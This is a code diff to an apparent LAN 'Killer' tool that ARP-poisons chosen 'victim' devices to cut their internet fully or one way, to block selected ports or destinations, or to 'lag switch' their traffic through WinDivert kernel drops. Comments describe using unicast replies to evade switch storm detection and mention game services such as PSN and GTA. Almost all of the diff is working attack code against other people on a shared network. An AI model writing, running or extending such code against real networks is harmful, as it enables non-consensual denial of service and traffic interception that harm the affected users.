@@ -48,14 +48,23 @@ class Killer:
         self.iface = get_default_iface()
         # Use guid (Scapy/pcap name) for conf.iface, not friendly name
         conf.iface = self.iface.guid if self.iface.guid else self.iface.name
-        # Kernel IP forwarding so selective blocks can forward the allowed traffic.
-        enable_ip_forwarding()
+        # NOTE: kernel IP forwarding is NOT enabled here. A full kill must NOT
+        # forward — on Windows, enabling IPEnableRouter globally makes the box
+        # route the ARP-poisoned traffic, so the victim keeps internet (the cut
+        # leaks). Forwarding is enabled only by modes that need it (one_way_kill /
+        # selective blocks), which pair it with a WinDivert drop of the filtered
+        # flow. A plain kill relies on ARP-poison + the OS dropping un-forwarded
+        # traffic, plus a WinDivert drop-all backstop on Windows.
         self.router: dict[str, object] = router
         self.killed: dict[str, dict[str, object]] = {}
         self.storage: dict[str, dict[str, object]] = {}
         self.pf_blocks: set[str] = set()
         # Windows kernel-forwarder handles, keyed by victim IP (WinDivert path).
+        # _wd_forwarders: the whole-victim drop (full kill / one-way).
+        # _wd_selective: per-victim selective drop (specific ports/dsts) — the rest
+        #   of the victim's traffic keeps flowing. Value: {'ports','dsts','proto','fwd'}.
         self._wd_forwarders: dict[str, object] = {}
+        self._wd_selective: dict[str, dict] = {}
         self._socket: Optional[object] = None  # Persistent L2 socket
         self._lock: threading.Lock = threading.Lock()  # Guards killed, forwarders, pf_blocks
         # Host-domain blocklist (PSN, GTA, …) over the firewall module.
@@ -104,21 +113,39 @@ class Killer:
                 log.debug('Socket close error (ignoring): %s', e)
             self._socket = None
     
-    @threaded
     def kill(self, victim: dict[str, object], wait_after: int = 2) -> None:
         """
-        Spoofing victim.
-        Default 2 second delay - ARP cache lasts 30-120s, no need to spam.
-        Prevents Windows NDIS throttling.
+        Full cut: ARP-poison the victim and drop all of its traffic.
+
+        On Windows we additionally start a WinDivert drop-all (both directions) so
+        the cut holds even if the box happens to be routing (e.g. IPEnableRouter
+        left on by a prior one-way kill): ARP-poison steers the traffic to us and
+        the kernel drops every forwarded packet for this victim. If routing is
+        off, the OS already drops the un-forwarded packets — either way, no leak.
+        Returns immediately; poisoning runs on a background thread.
         """
         with self._lock:
             if victim['mac'] in self.killed:
                 return
             self.killed[victim['mac']] = victim
 
+        # Windows: guarantee the cut with a kernel drop-all backstop.
+        if sys.platform.startswith('win'):
+            self._enforce_windivert_block(
+                victim['ip'], drop_from_victim=True, drop_to_victim=True)
+
+        self._poison(victim, wait_after)
+
+    @threaded
+    def _poison(self, victim: dict[str, object], wait_after: int = 2) -> None:
+        """ARP-poison loop for an already-registered victim (``self.killed``).
+
+        Shared by full ``kill`` and ``one_way_kill`` — the drop *policy* differs
+        (both-direction vs outbound-only), the poisoning is identical.
+        """
         # Send ARP reply (is-at) with proper Ethernet destination to poison caches
         # Unicast to specific MAC, not broadcast - avoids switch storm detection
-        
+
         # Victim: tell victim that router IP is at our MAC
         to_victim = Ether(dst=victim['mac'])/ARP(
             op=2,
@@ -178,6 +205,7 @@ class Killer:
                 sleep(0.1)
         self._remove_pf_block(victim['ip'])
         self._remove_windivert_block(victim['ip'])
+        self._remove_selective(victim['ip'])
 
     def kill_all(self, device_list: list[dict[str, object]]) -> None:
         """
@@ -199,8 +227,11 @@ class Killer:
             for ip in list(self.pf_blocks):
                 self._remove_pf_block(ip)
             wd_ips = list(self._wd_forwarders)
+            sel_ips = list(self._wd_selective)
         for ip in wd_ips:
             self._remove_windivert_block(ip)
+        for ip in sel_ips:
+            self._remove_selective(ip)
         # Close persistent socket when done
         self._close_socket()
     
@@ -247,32 +278,51 @@ class Killer:
             outbound (the netsh rule alone filtered the attacker's host, not the
             forwarded victim traffic).
         """
-        # Ensure victim is being ARP poisoned
-        if victim['mac'] not in self.killed:
-            self.kill(victim)
+        # Ensure victim is being ARP poisoned (without full kill's drop-all).
+        with self._lock:
+            new = victim['mac'] not in self.killed
+            self.killed[victim['mac']] = victim
+        if new:
+            self._poison(victim)
             # Wait for poison to start
             for _ in range(10):
                 sleep(0.1)
                 if victim['mac'] in self.killed:
                     break
 
-        # Block outbound at kernel level (no slow Python forwarder).
+        # One-way needs the ALLOWED (inbound) direction to keep flowing, so turn
+        # on kernel forwarding here (sysctl on mac/linux, IPEnableRouter on Windows)
+        # — unlike a full kill, which must not forward.
+        enable_ip_forwarding()
+
+        # Drop only the victim's outbound at kernel level (no slow Python forwarder).
         if sys.platform.startswith('win'):
-            self._enforce_windivert_block(victim['ip'])
+            self._enforce_windivert_block(
+                victim['ip'], drop_from_victim=True, drop_to_victim=False)
         # Keep the firewall block as a portable backstop on every OS.
         self._enforce_pf_block(victim['ip'])
 
-    def _enforce_windivert_block(self, victim_ip: str) -> None:
-        """Start (idempotently) a WinDivert kernel drop for the victim's outbound."""
+    def _enforce_windivert_block(self, victim_ip: str, drop_from_victim: bool = True,
+                                 drop_to_victim: bool = False) -> None:
+        """Start a WinDivert kernel drop for a victim with the given direction policy.
+
+        Idempotent when the running policy already matches; if it differs (e.g.
+        switching a full kill to one-way), the existing forwarder is replaced.
+        """
         with self._lock:
-            if victim_ip in self._wd_forwarders:
-                return
+            existing = self._wd_forwarders.get(victim_ip)
+        if existing is not None:
+            if (getattr(existing, 'drop_from_victim', None) == drop_from_victim and
+                    getattr(existing, 'drop_to_victim', None) == drop_to_victim):
+                return  # already the right policy
+            self._remove_windivert_block(victim_ip)  # policy changed → replace
         try:
             from networking.windivert_forwarder import WinDivertForwarder, WINDIVERT_AVAILABLE
             if not WINDIVERT_AVAILABLE:
                 return
             fwd = WinDivertForwarder()
-            if fwd.start(victim_ip, drop_from_victim=True):
+            if fwd.start(victim_ip, drop_from_victim=drop_from_victim,
+                         drop_to_victim=drop_to_victim):
                 with self._lock:
                     self._wd_forwarders[victim_ip] = fwd
         except Exception as e:  # noqa: BLE001 - never let the kernel path break a kill
@@ -287,6 +337,117 @@ class Killer:
                 fwd.stop()
             except Exception as e:  # noqa: BLE001
                 log.debug('WinDivert stop error (ignoring): %s', e)
+
+    # -- selective (port / destination) blocking of a victim's forwarded traffic --
+    #
+    # Unlike a full/one-way kill (which drop the whole victim), these drop only
+    # specific flows — a port, or traffic to a destination IP — while the rest of
+    # the victim's traffic keeps flowing. On Windows that means a WinDivert
+    # NETWORK_FORWARD drop whose filter matches exactly those flows; criteria
+    # accumulate per victim and the forwarder is rebuilt on each change.
+
+    def selective_block(self, victim_ip: str, ports=None, dst_ips=None,
+                        proto: Optional[str] = None) -> bool:
+        """Drop specific ports/destinations of a victim's forwarded traffic.
+
+        Windows-only kernel path (mac/linux apply pf/nft selective rules via the
+        firewall module). Requires the victim to be ARP-poisoned; enables kernel
+        forwarding so the *allowed* flows still pass. Returns True on success.
+        """
+        if not sys.platform.startswith('win'):
+            return False
+        enable_ip_forwarding()  # allowed flows must forward at kernel speed
+        with self._lock:
+            st = self._wd_selective.setdefault(
+                victim_ip, {'ports': set(), 'dsts': set(), 'proto': None, 'fwd': None})
+            if ports:
+                st['ports'].update(int(p) for p in ports)
+            if dst_ips:
+                st['dsts'].update(str(d) for d in dst_ips)
+            if proto:
+                st['proto'] = proto.lower()
+        return self._rebuild_selective(victim_ip)
+
+    def selective_unblock(self, victim_ip: str, ports=None, dst_ips=None) -> bool:
+        """Remove some (or, if none given, all) selective drops for a victim."""
+        with self._lock:
+            st = self._wd_selective.get(victim_ip)
+            if st is None:
+                return True
+            if ports is None and dst_ips is None:
+                st['ports'].clear()
+                st['dsts'].clear()
+            else:
+                for p in (ports or ()):
+                    st['ports'].discard(int(p))
+                for d in (dst_ips or ()):
+                    st['dsts'].discard(str(d))
+            empty = not st['ports'] and not st['dsts']
+        if empty:
+            self._remove_selective(victim_ip)
+            return True
+        return self._rebuild_selective(victim_ip)
+
+    def selective_unblock_port(self, port: int) -> None:
+        """Remove ``port`` from every victim's selective drop set (Windows)."""
+        for ip in list(self._wd_selective):
+            self.selective_unblock(ip, ports=[port])
+
+    def _rebuild_selective(self, victim_ip: str) -> bool:
+        """(Re)start the victim's selective WinDivert drop from accumulated criteria."""
+        try:
+            from networking.windivert_forwarder import WinDivertForwarder, WINDIVERT_AVAILABLE
+            if not WINDIVERT_AVAILABLE:
+                return False
+        except Exception:  # noqa: BLE001
+            return False
+        with self._lock:
+            st = self._wd_selective.get(victim_ip)
+            if st is None:
+                return False
+            ports = sorted(st['ports']) or None
+            dsts = sorted(st['dsts']) or None
+            proto = st['proto']
+            old = st['fwd']
+        if old is not None:
+            try:
+                old.stop()
+            except Exception:  # noqa: BLE001
+                pass
+        fwd = WinDivertForwarder()
+        ok = fwd.start(victim_ip, drop_from_victim=True, ports=ports,
+                       dst_ips=dsts, proto=proto)
+        with self._lock:
+            if victim_ip in self._wd_selective:
+                self._wd_selective[victim_ip]['fwd'] = fwd if ok else None
+        if not ok:
+            log.warning('Selective WinDivert block failed for %s', victim_ip)
+        return ok
+
+    def _remove_selective(self, victim_ip: str) -> None:
+        """Stop and forget a victim's selective WinDivert drop, if any."""
+        with self._lock:
+            st = self._wd_selective.pop(victim_ip, None)
+        if st and st.get('fwd') is not None:
+            try:
+                st['fwd'].stop()
+            except Exception as e:  # noqa: BLE001
+                log.debug('Selective stop error (ignoring): %s', e)
+
+    def lag(self, victim: dict[str, object], on: bool) -> None:
+        """Lag switch: toggle a full kernel drop of a poisoned victim on/off.
+
+        The GUI flips this rapidly to induce latency/packet loss. On Windows it
+        drops all of the victim's forwarded traffic while ``on`` (both directions)
+        and releases it while ``off``, at kernel level.
+        """
+        if not sys.platform.startswith('win'):
+            return
+        if on:
+            self._enforce_windivert_block(
+                victim['ip'], drop_from_victim=True, drop_to_victim=True)
+        else:
+            self._remove_windivert_block(victim['ip'])
 
     def _enforce_pf_block(self, victim_ip: str) -> None:
         if victim_ip in self.pf_blocks:
